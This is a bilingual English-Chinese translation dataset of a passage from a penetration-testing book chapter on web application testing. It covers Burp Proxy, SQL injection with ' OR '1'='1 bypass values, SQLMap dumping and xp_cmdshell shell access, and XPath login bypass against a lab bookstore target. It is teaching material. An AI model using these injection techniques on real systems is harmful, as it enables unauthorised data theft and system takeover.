- en: Chapter 14. Web Application Testing
  id: totrans-0
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 第 14 章. Web 应用程序测试
- en: Though automated scanners are great at finding known vulnerabilities in web
    applications, many clients build custom web applications. Sure, commercial products
    can automate attacks against user input fields in custom web applications, but
    nothing can replace a good penetration tester with a proxy when it comes to finding
    security issues in these applications.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然自动化扫描工具非常擅长发现 Web 应用程序中的已知漏洞，但许多客户会构建自定义 Web 应用程序。的确，商业产品可以自动化对自定义 Web 应用程序中用户输入字段的攻击，但在发现这些应用程序中的安全问题时，没有什么能替代使用代理的优秀渗透测试员。
- en: Like all software, web applications may have issues when input is not properly
    sanitized. For example, when an application pulls data from a database based on
    certain user input, the application may expect specific input such as a username
    and password. If, instead, the user enters special input to create additional
    database queries, he or she may be able to steal data from the database, bypass
    authentication, or even execute commands on the underlying system.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 像所有软件一样，当输入未正确清理时，Web 应用程序可能会出现问题。例如，当应用程序根据特定用户输入从数据库中提取数据时，应用程序可能会期望输入特定内容，如用户名和密码。如果用户输入特殊内容，试图创建额外的数据库查询，那么他或她可能能够从数据库中窃取数据、绕过身份验证，甚至在底层系统上执行命令。
- en: 'In this chapter we’ll look at finding some common vulnerabilities in web applications
    using the example web application installed on the Windows 7 target: a simple
    bookstore with several security issues frequently found in web applications. (See
    [Installing Additional Software](ch01.xhtml#installing_additional_software "Installing
    Additional Software") for installation instructions.)'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将通过使用安装在 Windows 7 目标上的示例 Web 应用程序，来查看如何发现 Web 应用程序中的一些常见漏洞：这是一个简单的书店，具有
    Web 应用程序中经常发现的几个安全问题。（安装说明请参见[安装附加软件](ch01.xhtml#installing_additional_software
    "Installing Additional Software")）
- en: Using Burp Proxy
  id: totrans-4
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 Burp Proxy
- en: We can use a proxy to capture requests and responses between our browser and
    the web application so we can see exactly what data is being transmitted. Kali
    Linux comes with the free version of Burp Suite, a testing platform for web applications
    that includes a proxy feature. Burp includes other useful components, such as
    Burp Spider, which can crawl through web application content and functionality,
    and Burp Repeater, which allows you to manipulate and resend requests to the server.
    For now, we’ll focus on the Burp Proxy tab.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用代理捕获浏览器与 Web 应用程序之间的请求和响应，这样我们就能准确看到传输的数据。Kali Linux 附带了 Burp Suite 的免费版本，这是一款用于
    Web 应用程序测试的平台，其中包括代理功能。Burp 还包含其他有用的组件，如 Burp Spider，可以爬取 Web 应用程序的内容和功能，以及 Burp
    Repeater，它允许你操作并重新发送请求到服务器。现在，我们将专注于 Burp Proxy 选项卡。
- en: To start Burp Suite in Kali Linux, go to Applications at the top left of the
    Kali GUI, and then click **Kali Linux** ▸ **Web Applications** ▸ **Web Application
    Fuzzers** ▸ **burpsuite**, as shown in [Figure 14-1](ch14.xhtml#starting_burp_suite_in_kali
    "Figure 14-1. Starting Burp Suite in Kali").
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 要在 Kali Linux 中启动 Burp Suite，请在 Kali 图形界面的左上角点击“应用程序”，然后依次点击 **Kali Linux**
    ▸ **Web 应用程序** ▸ **Web 应用程序模糊测试工具** ▸ **burpsuite**，如[图 14-1](ch14.xhtml#starting_burp_suite_in_kali
    "图 14-1. 在 Kali 中启动 Burp Suite")所示。
- en: '![Starting Burp Suite in Kali](httpatomoreillycomsourcenostarchimages2030426.png.jpg)Figure 14-1. Starting
    Burp Suite in Kali'
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: '![在 Kali 中启动 Burp Suite](httpatomoreillycomsourcenostarchimages2030426.png.jpg)图
    14-1. 在 Kali 中启动 Burp Suite'
- en: Click the Proxy tab, as shown in [Figure 14-2](ch14.xhtml#burp_proxy_interface
    "Figure 14-2. Burp Proxy interface"). By default, the Intercept is on button should
    be selected so that Burp Suite intercepts and traps any outgoing requests from
    a web browser configured to use Burp as a proxy for web traffic. This setting
    will allow us to see and even modify the details of web requests before they are
    sent to the server.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 Proxy 选项卡，如[图 14-2](ch14.xhtml#burp_proxy_interface "图 14-2. Burp Proxy 界面")所示。默认情况下，应该选择“拦截开启”按钮，以便
    Burp Suite 拦截并捕获所有来自配置为使用 Burp 作为 Web 流量代理的 Web 浏览器的请求。此设置将允许我们查看，甚至修改发送到服务器之前的
    Web 请求的详细信息。
- en: '![Burp Proxy interface](httpatomoreillycomsourcenostarchimages2030428.png.jpg)Figure 14-2. Burp
    Proxy interface'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: '![Burp Proxy 界面](httpatomoreillycomsourcenostarchimages2030428.png.jpg)图 14-2.
    Burp Proxy 界面'
- en: Now we need to tell our browser in Kali Linux to proxy web traffic through Burp
    Suite.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们需要告诉 Kali Linux 中的浏览器通过 Burp Suite 来代理 Web 流量。
- en: Open the Iceweasel browser, go to **Edit** ▸ **Preferences** ▸ **Advanced**,
    and select the **Network** tab.
  id: totrans-11
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开 Iceweasel 浏览器，依次点击 **编辑** ▸ **首选项** ▸ **高级**，并选择 **网络** 选项卡。
- en: Click **Settings** to the right of Connection.
  id: totrans-12
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击连接右侧的 **设置**。
- en: In the Connection Settings dialog, shown in [Figure 14-3](ch14.xhtml#setting_a_proxy_in_iceweasel
    "Figure 14-3. Setting a proxy in Iceweasel"), select **Manual proxy configuration**,
    and enter the IP address **`127.0.0.1`** and port **`8080`**. This tells Iceweasel
    to proxy traffic through the localhost on port 8080, the default port for Burp
    Proxy.
  id: totrans-13
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在[图14-3](ch14.xhtml#setting_a_proxy_in_iceweasel "图14-3. 在Iceweasel中设置代理")所示的连接设置对话框中，选择**手动代理配置**，并输入IP地址**`127.0.0.1`**和端口**`8080`**。这告诉Iceweasel通过本地主机的8080端口代理流量，这是Burp
    Proxy的默认端口。
- en: '![Setting a proxy in Iceweasel](httpatomoreillycomsourcenostarchimages2030430.png.jpg)Figure 14-3. Setting
    a proxy in Iceweasel'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: '![在Iceweasel中设置代理](httpatomoreillycomsourcenostarchimages2030430.png.jpg)图14-3.
    在Iceweasel中设置代理'
- en: 'To ensure that Iceweasel will proxy all our traffic through Burp Suite, browse
    to the URL bookservice on your Windows 7 target: *[http://192.168.20.12/bookservice](http://192.168.20.12/bookservice)*.'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 为确保Iceweasel将所有流量通过Burp Suite代理，请在Windows 7目标机上浏览网址bookservice：*[http://192.168.20.12/bookservice](http://192.168.20.12/bookservice)*。
- en: The connection should appear to hang in the browser, and the browser and Burp
    Suite should light up as the `HTTP GET` request for the main page of the bookservice
    site is captured by Burp Proxy, as shown in [Figure 14-4](ch14.xhtml#captured_http_get_request
    "Figure 14-4. Captured HTTP GET request").
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 连接在浏览器中应该会看起来停滞不前，浏览器和Burp Suite应该会亮起，当bookservice站点的主页的`HTTP GET`请求被Burp Proxy捕获时，如[图14-4](ch14.xhtml#captured_http_get_request
    "图14-4. 捕获的HTTP GET请求")所示。
- en: '![Captured HTTP GET request](httpatomoreillycomsourcenostarchimages2030432.png.jpg)Figure 14-4. Captured
    `HTTP GET` request'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: '![捕获的HTTP GET请求](httpatomoreillycomsourcenostarchimages2030432.png.jpg)图14-4.
    捕获的`HTTP GET`请求'
- en: We can see the details of the `HTTP GET` request asking the server for the bookservice
    web page.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到请求服务器bookservice网页的`HTTP GET`请求的详细信息。
- en: As we will see later, we can make changes to the request before sending it on
    to the server, but for now, let’s just go ahead and forward the request (and any
    subsequent ones) by clicking the **Forward** button. Returning to the browser,
    we see the server has sent us the main page of the bookservice site, as shown
    in [Figure 14-5](ch14.xhtml#bookservice_site "Figure 14-5. Bookservice site").
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 如我们稍后将看到的，我们可以在将请求发送到服务器之前进行更改，但现在我们先通过点击**转发**按钮将请求（以及任何后续请求）转发出去。返回浏览器后，我们看到服务器已向我们发送了bookservice站点的主页，如[图14-5](ch14.xhtml#bookservice_site
    "图14-5. Bookservice 站点")所示。
- en: '![Bookservice site](httpatomoreillycomsourcenostarchimages2030434.png.jpg)Figure 14-5. Bookservice
    site'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: '![Bookservice站点](httpatomoreillycomsourcenostarchimages2030434.png.jpg)图14-5.
    Bookservice站点'
- en: Next let’s try signing up for an account ([Figure 14-6](ch14.xhtml#signing_up_for_a_new_account
    "Figure 14-6. Signing up for a new account")). Click **Login** at the top left
    of the page, and then forward the request to the server from the proxy. Do the
    same to get to the Sign Up page by clicking **New User** and forwarding the request
    to the server.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来让我们尝试注册一个账户（[图14-6](ch14.xhtml#signing_up_for_a_new_account "图14-6. 注册新账户")）。点击页面左上角的**登录**，然后通过代理将请求转发到服务器。同样，点击**新用户**进入注册页面，并将请求转发到服务器。
- en: '![Signing up for a new account](httpatomoreillycomsourcenostarchimages2030436.png.jpg)Figure 14-6. Signing
    up for a new account'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: '![注册新账户](httpatomoreillycomsourcenostarchimages2030436.png.jpg)图14-6. 注册新账户'
- en: Enter a username, password, and email address, then submit the request by clicking
    **Go**. The request should be captured in Burp Proxy, as shown in [Figure 14-7](ch14.xhtml#captured_request
    "Figure 14-7. Captured request").
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 输入用户名、密码和电子邮件地址，然后通过点击**开始**提交请求。请求应该会在Burp Proxy中被捕获，如[图14-7](ch14.xhtml#captured_request
    "图14-7. 捕获的请求")所示。
- en: '![Captured request](httpatomoreillycomsourcenostarchimages2030438.png.jpg)Figure 14-7. Captured
    request'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: '![捕获的请求](httpatomoreillycomsourcenostarchimages2030438.png.jpg)图14-7. 捕获的请求'
- en: In addition to looking at the raw request, which is a bit unfriendly to read,
    you can click the Params tab at the top of the request window in Burp Suite to
    display the request parameters in a more readable format, as shown in [Figure 14-8](ch14.xhtml#request_parameters
    "Figure 14-8. Request parameters").
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 除了查看原始请求外，它读起来有点不友好，你可以点击Burp Suite请求窗口顶部的Params标签，以更易读的格式显示请求参数，如[图14-8](ch14.xhtml#request_parameters
    "图14-8. 请求参数")所示。
- en: '![Request parameters](httpatomoreillycomsourcenostarchimages2030440.png.jpg)Figure 14-8. Request
    parameters'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: '![请求参数](httpatomoreillycomsourcenostarchimages2030440.png.jpg)图14-8. 请求参数'
- en: For example, the new display shows the User field *georgia*, Pass field *password*,
    and Email field *georgia@bulbsecurity.com*.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，新显示的界面显示了用户字段*georgia*，密码字段*password*，以及电子邮件字段*georgia@bulbsecurity.com*。
- en: You can change these fields directly in the proxy. For example, if you change
    *georgia*’s password to *password1* before forwarding the request to the server,
    the server will set the password for user *georgia* to *password1*, because the
    server never saw the original request from the browser requesting the password
    *password*.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以直接在代理中更改这些字段。例如，如果你在将请求转发到服务器之前，将*georgia*的密码更改为*password1*，服务器将把用户*georgia*的密码设置为*password1*，因为服务器从未看到浏览器请求原始密码*password*的请求。
- en: The proxy allows you to see the details of any request to the server. If at
    any point you don’t need to proxy traffic, click **Intercept is on** to toggle
    it to **Intercept is off** and allow traffic to pass through to the server without
    user interaction. Switch the button back on if you want to catch a particular
    request.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 代理允许你查看任何请求到服务器的详细信息。如果在任何时候你不需要代理流量，点击**拦截开启**将其切换为**拦截关闭**，并允许流量直接通过服务器，无需用户交互。如果你想捕获某个特定请求，可以将按钮重新打开。
- en: SQL Injection
  id: totrans-30
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: SQL 注入
- en: Many web applications store data in a backend, SQL-based database. For example,
    we encountered a SQL database during our network penetration test, when we found
    an open MySQL database through phpMyAdmin in the XAMPP install on the Windows
    XP target in [Exploiting Open phpMyAdmin](ch08.xhtml#exploiting_open_phpmyadmin
    "Exploiting Open phpMyAdmin"). We then used a SQL query to write a simple PHP
    command shell to the web server.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 许多 web 应用将数据存储在后台的 SQL 数据库中。例如，在我们的网络渗透测试中，我们遇到了一个 SQL 数据库，当时我们通过 Windows XP
    目标机器上的 XAMPP 安装中的 phpMyAdmin 找到了一个开放的 MySQL 数据库，在[利用开放的 phpMyAdmin](ch08.xhtml#exploiting_open_phpmyadmin
    "Exploiting Open phpMyAdmin")一章中提到。然后我们使用 SQL 查询将一个简单的 PHP 命令 Shell 写入 Web 服务器。
- en: We typically won’t have direct access to run SQL queries on a site’s backend
    database from a web application. However, if a developer fails to sanitize user
    input when interacting with the database, you may find that you can perform a
    *SQL injection attack* to manipulate the queries sent to it. Successful SQL injection
    attacks can read data from the database, modify data, shut down or destroy the
    database, and, in some cases, even run commands on the underlying operating system
    (which can be especially powerful because database servers often run as privileged
    users).
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通常无法直接在网站的后台数据库上执行 SQL 查询。然而，如果开发人员在与数据库交互时未能对用户输入进行消毒处理，你可能会发现可以执行*SQL 注入攻击*来操控发送到数据库的查询。成功的
    SQL 注入攻击可以从数据库读取数据、修改数据、关闭或销毁数据库，甚至在某些情况下在底层操作系统上执行命令（这尤其强大，因为数据库服务器通常以特权用户身份运行）。
- en: 'A natural place to look for SQL injection issues is in the login page. Many
    web applications store user data in a database, so we can use a SQL query to pull
    out the correct user, based on the username and password provided by the user.
    When developers don’t sanitize user input, we can build SQL queries to attack
    the database. An example of an injectable SQL statement that could be leveraged
    by an attacker is shown here:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 查找 SQL 注入问题的自然地方是登录页面。许多 web 应用将用户数据存储在数据库中，因此我们可以使用 SQL 查询根据用户提供的用户名和密码拉取正确的用户信息。当开发人员未消毒用户输入时，我们可以构造
    SQL 查询来攻击数据库。以下是一个攻击者可能利用的可注入 SQL 语句示例：
- en: '[PRE0]'
  id: totrans-34
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'What if an attacker supplied a username *’ OR ’1’=’1* and the user’s password
    was *’ OR ’1’=’1*? The SQL statement turns into:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者提供了用户名*' OR '1'='1*，而用户密码为*' OR '1'='1*，会发生什么？SQL 语句会变成：
- en: '[PRE1]'
  id: totrans-36
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: Because the *OR ’1’=’1’* will always be true, this `SELECT` statement will now
    return the first username in the user table, regardless of the username and password.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 因为*OR '1'='1'*始终为真，这个`SELECT`语句现在会返回用户表中的第一个用户名，无论用户名和密码是什么。
- en: 'As we’ll see in [XPath Injection](ch14.xhtml#xpath_injection "XPath Injection"),
    our application uses Xpath, a query language for XML documents, which authenticates
    against an XML file rather than a database, though the injection process is similar.
    However, our application does use a SQL database to store records of the books
    available in the store, and when we select a book on the main page, its details
    are pulled from an MS SQL backend database. For example, click the **More Details**
    link for the first book on the site, *Don’t Make Me Think*. The URL requested
    is:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 如我们将在[XPath 注入](ch14.xhtml#xpath_injection "XPath 注入")中看到的那样，应用程序使用了 XPath，这是一种用于
    XML 文档的查询语言，它是通过与 XML 文件而非数据库进行身份验证，尽管注入过程相似。然而，我们的应用程序确实使用了 SQL 数据库来存储商店中可用书籍的记录，当我们在主页上选择一本书时，其详细信息是从
    MS SQL 后端数据库中提取的。例如，点击网站上第一本书《*Don’t Make Me Think*》的**更多详情**链接，请求的 URL 为：
- en: '[PRE2]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: The book’s details are filled in based on the results returned from the database
    query for the record with ID `1`.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 本书的详细信息是基于从数据库查询返回的记录（ID 为 `1`）的结果填写的。
- en: Testing for SQL Injection Vulnerabilities
  id: totrans-41
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 测试 SQL 注入漏洞
- en: A typical first test for SQL injection vulnerabilities is to use a single quotation
    mark to close the SQL query. If a SQL injection vulnerability is present, the
    addition of that quotation mark should cause the application to throw a SQL error,
    because the query will already be closed as part of the underlying code and the
    extra single quote will cause the SQL syntax to be incorrect. That error will
    tell us that we can inject SQL queries to the site’s database using the `id` parameter.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 典型的 SQL 注入漏洞首次测试方法是使用单引号闭合 SQL 查询。如果存在 SQL 注入漏洞，添加该引号应该会导致应用程序抛出 SQL 错误，因为查询在底层代码中已经闭合，额外的单引号会导致
    SQL 语法错误。该错误将告诉我们，我们可以使用 `id` 参数向网站的数据库注入 SQL 查询。
- en: Let’s try this out by sending the query again with the `id` parameter to *1’*,
    as shown here.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们尝试通过发送带有 `id` 参数为 *1’* 的查询来验证此情况，如下所示。
- en: '[PRE3]'
  id: totrans-44
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: As expected, the application serves an error page indicating that our SQL syntax
    is incorrect, as shown in [Figure 14-9](ch14.xhtml#application_identifies_a_sql_errordot
    "Figure 14-9. The application identifies a SQL error.").
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 正如预期的那样，应用程序返回了一个错误页面，指出我们的 SQL 语法不正确，如[图 14-9](ch14.xhtml#application_identifies_a_sql_errordot
    "图 14-9. 应用程序识别到 SQL 错误")所示。
- en: '![The application identifies a SQL error.](httpatomoreillycomsourcenostarchimages2030442.png.jpg)Figure 14-9. The
    application identifies a SQL error.'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '![应用程序识别到 SQL 错误](httpatomoreillycomsourcenostarchimages2030442.png.jpg)图 14-9.
    应用程序识别到 SQL 错误。'
- en: In particular, note the message “Unclosed quotation mark after the character
    string” in our SQL query.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 特别需要注意的是，SQL 查询中的“字符串后缺少引号”这一信息。
- en: Note
  id: totrans-48
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Not all applications that are vulnerable to SQL injection will be so verbose
    with their error messages. In fact, there is a whole class of blind SQL injection
    vulnerabilities, where error messages detailing the injection are not shown, even
    though the injection flaw is still present.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 并非所有容易受到 SQL 注入攻击的应用程序都会详细显示错误信息。事实上，有一类称为盲 SQL 注入漏洞，其中即使存在注入缺陷，错误信息也不会显示出来。
- en: Exploiting SQL Injection Vulnerabilities
  id: totrans-50
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 利用 SQL 注入漏洞
- en: 'Now that we know a SQL injection vulnerability is present in this site, we
    can exploit it to run additional queries on the database that the developer never
    intended. For example, we can find out the name of the first database with the
    following query:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道该网站存在 SQL 注入漏洞，我们可以利用这个漏洞对数据库执行开发者未曾预料的其他查询。例如，我们可以通过以下查询来查找第一个数据库的名称：
- en: '[PRE4]'
  id: totrans-52
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: The query throws an error message, *Conversion failed when converting the nvarchar
    value ‘BookApp’ to data type int*, which tells us that the name of the first database
    is BookApp, as shown in [Figure 14-10](ch14.xhtml#error_message_showing_the_database_name
    "Figure 14-10. Error message showing the database name").
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 查询抛出了一个错误信息，*转换失败，无法将 nvarchar 值 ‘BookApp’ 转换为 int 数据类型*，这告诉我们第一个数据库的名称是 BookApp，如[图
    14-10](ch14.xhtml#error_message_showing_the_database_name "图 14-10. 显示数据库名称的错误信息")所示。
- en: '![Error message showing the database name](httpatomoreillycomsourcenostarchimages2030444.png.jpg)Figure 14-10. Error
    message showing the database name'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '![显示数据库名称的错误信息](httpatomoreillycomsourcenostarchimages2030444.png.jpg)图 14-10.
    显示数据库名称的错误信息'
- en: Using SQLMap
  id: totrans-55
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 SQLMap
- en: We can also use tools to automatically generate SQL queries to perform various
    tasks on a site using SQL injection. All we need is an injection point; the tool
    does the rest. For example, [Example 14-1](ch14.xhtml#dumping_the_database_with_sqlmap
    "Example 14-1. Dumping the database with SQLMap") shows how when we give a tool
    in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL injection vulnerabilities
    and performs injection queries.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用工具自动生成SQL查询，通过SQL注入在站点上执行各种任务。我们只需要一个注入点，其它的交给工具处理。例如，[示例14-1](ch14.xhtml#dumping_the_database_with_sqlmap
    "示例14-1. 使用SQLMap转储数据库")展示了当我们向Kali中的SQLMap工具提供一个潜在可注入的URL时，SQLMap会测试SQL注入漏洞并执行注入查询。
- en: Example 14-1. Dumping the database with SQLMap
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 示例14-1. 使用SQLMap转储数据库
- en: '[PRE5]'
  id: totrans-58
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: Specify the URL to test with `-u` option ❶. The `--dump` option ❷ dumps the
    contents of the database—in this case, details of the books.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`-u`选项❶指定要测试的URL。`--dump`选项❷会转储数据库的内容——在这个例子中，就是书籍的详细信息。
- en: We can also use SQLMap to try to get command-shell access on the underlying
    system. MS SQL databases contain a stored procedure called `xp_cmdshell`, which
    will give us command-shell access, but it’s often disabled. Luckily, SQLMap will
    try to reenable it. [Example 14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql
    "Example 14-2. xp_cmdshell access through SQL injection") shows how we can get
    a command shell on the site’s underlying Windows 7 target system using SQLMap.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用SQLMap尝试获取底层系统的命令Shell访问权限。MS SQL数据库包含一个名为`xp_cmdshell`的存储过程，它可以为我们提供命令Shell访问权限，但通常是禁用的。幸运的是，SQLMap会尝试重新启用它。[示例14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql
    "示例14-2. 通过SQL注入访问xp_cmdshell")展示了我们如何使用SQLMap在站点的底层Windows 7目标系统上获得命令Shell。
- en: Example 14-2. `xp_cmdshell` access through SQL injection
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 示例14-2. 通过SQL注入访问`xp_cmdshell`
- en: '[PRE6]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: As you can see in [Example 14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql
    "Example 14-2. xp_cmdshell access through SQL injection"), we receive a shell
    running as *System* without having to guess credentials for the database.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 如[示例14-2](ch14.xhtml#xpunderscorecmdshell_access_through_sql "示例14-2. 通过SQL注入访问xp_cmdshell")所示，我们可以获得一个以*System*身份运行的Shell，而无需猜测数据库的凭证。
- en: Note
  id: totrans-64
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: The MS SQL database is not listening on a port anyway, so we can’t access it
    directly. Unlike our Windows XP system in [Chapter 6](ch06.xhtml "Chapter 6. Finding
    Vulnerabilities"), this web server lacks phpMyAdmin, so we have no other way to
    access the database. A SQL injection issue in the hosted website gives us full
    system access.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: MS SQL数据库本身没有在端口上监听，因此我们无法直接访问它。与[第6章](ch06.xhtml "第6章. 查找漏洞")中的Windows XP系统不同，这个Web服务器没有phpMyAdmin，因此我们无法通过其它方式访问数据库。托管网站中的SQL注入问题让我们获得了完整的系统访问权限。
- en: XPath Injection
  id: totrans-66
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: XPath注入
- en: As mentioned previously, this bookservice application uses XML authentication,
    in which the XML is queried using Xpath. We can use *XPath injection* to attack
    XML. Though its syntax differs from SQL, the injection process is similar.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，本书服务应用程序使用XML认证，其中XML通过Xpath进行查询。我们可以使用*XPath注入*攻击XML。尽管其语法与SQL不同，但注入过程是相似的。
- en: For example, try entering single quotes (**`'`**) for both the username and
    password fields at the login page. You should receive an error like the one shown
    in [Figure 14-11](ch14.xhtml#xml_error_at_login "Figure 14-11. XML error at login").
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，尝试在登录页面的用户名和密码字段中分别输入单引号（**`'`**）。你应该会收到一个类似于[图14-11](ch14.xhtml#xml_error_at_login
    "图14-11. 登录时XML错误")所示的错误。
- en: '![XML error at login](httpatomoreillycomsourcenostarchimages2030446.png.jpg)Figure 14-11. XML
    error at login'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '![登录时XML错误](httpatomoreillycomsourcenostarchimages2030446.png.jpg)图14-11. 登录时XML错误'
- en: As you can see from the error message shown in [Figure 14-11](ch14.xhtml#xml_error_at_login
    "Figure 14-11. XML error at login"), we again have an injection issue because
    we have an error in our syntax. Because we are at a login page, a typical injection
    strategy for Xpath would be to attempt to bypass authentication and gain access
    to the authenticated portion of the application by attacking the Xpath query logic.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 如[图14-11](ch14.xhtml#xml_error_at_login "图14-11. 登录时XML错误")所示的错误消息，我们再次遇到注入问题，因为我们的语法出现了错误。由于我们处于登录页面，Xpath的典型注入策略是尝试绕过身份验证，通过攻击Xpath查询逻辑访问经过身份验证的应用程序部分。
- en: For example, as shown in the error details, the login query grabs the username
    and password provided, and then compares the values provided against credentials
    in an XML file. Can we create a query to bypass the need for valid credentials?
    Enter a set of dummy credentials at login, and capture the request with Burp Proxy,
    as shown in [Figure 14-12](ch14.xhtml#captured_login_request "Figure 14-12. Captured
    login request").
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，如错误详情所示，登录查询会抓取提供的用户名和密码，然后将提供的值与XML文件中的凭据进行比较。我们能否创建一个查询来绕过有效凭据的需求？在登录时输入一组虚拟凭据，并使用Burp
    Proxy捕获请求，如[图14-12](ch14.xhtml#captured_login_request "图14-12. 捕获的登录请求")所示。
- en: Now change the `txtUser` and `txtPass` parameters in the captured request to
    this value.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，将捕获请求中的`txtUser`和`txtPass`参数更改为该值。
- en: '[PRE7]'
  id: totrans-73
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: '![Captured login request](httpatomoreillycomsourcenostarchimages2030448.png.jpg)Figure 14-12. Captured
    login request'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: '![捕获的登录请求](httpatomoreillycomsourcenostarchimages2030448.png.jpg)图14-12. 捕获的登录请求'
- en: This tells the login Xpath query to find the user account where the username
    and password field is blank or *1=1*. Because *1=1* always evaluates as true,
    the logic of this query says to return the user where the username is blank or
    present—likewise with the password. Thus using this injection method, we can get
    the application to log us in as the first user in the authentication file. And,
    as shown in [Figure 14-13](ch14.xhtml#authentication_bypass_through_xpath_inje
    "Figure 14-13. Authentication bypass through Xpath injection"), we are logged
    in as the user *Mike*.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 这告诉登录Xpath查询查找用户名和密码字段为空或*1=1*的用户账户。因为*1=1*始终为真，所以这个查询的逻辑是返回用户名为空或存在的用户——密码也是如此。因此，通过这种注入方法，我们可以让应用程序让我们作为身份验证文件中的第一个用户登录。如[图14-13](ch14.xhtml#authentication_bypass_through_xpath_inje
    "图14-13. 通过Xpath注入绕过身份验证")所示，我们已作为用户*Mike*登录。
- en: '![Authentication bypass through Xpath injection](httpatomoreillycomsourcenostarchimages2030450.png.jpg)Figure 14-13. Authentication
    bypass through Xpath injection'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '![通过Xpath注入绕过身份验证](httpatomoreillycomsourcenostarchimages2030450.png.jpg)图14-13.
    通过Xpath注入绕过身份验证'
- en: Local File Inclusion
  id: totrans-77
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 本地文件包含
- en: Another vulnerability commonly found in web applications is *local file inclusion*,
    which is the ability to read files from the application or the rest of the filesystem
    that we should not have access to through the web app. We saw an example of this
